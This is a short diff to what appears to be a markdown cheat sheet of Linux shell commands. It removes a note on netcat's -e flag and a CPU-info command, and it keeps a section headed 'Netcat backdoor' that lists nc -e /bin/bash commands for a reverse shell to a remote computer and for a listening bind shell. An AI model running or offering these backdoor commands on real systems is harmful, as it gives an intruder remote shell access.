@@ -101,16 +101,10 @@ ls -a | find | grep -i "string"
 ```
 
 **Netcat backdoor**
-*Does not work with most distro's default version of netcat (most do not define ENABLE_GAPING_SECURITY_HOLE which turns on -e)*
 ```bash
 nc -e /bin/bash *remotecomputer* *port*
 OR
 nc -e /bin/bash -lp *port*
-```
-
-**View CPU Information**
-```bash
-cat /proc/cpuinfo
 ```
 
 Credits
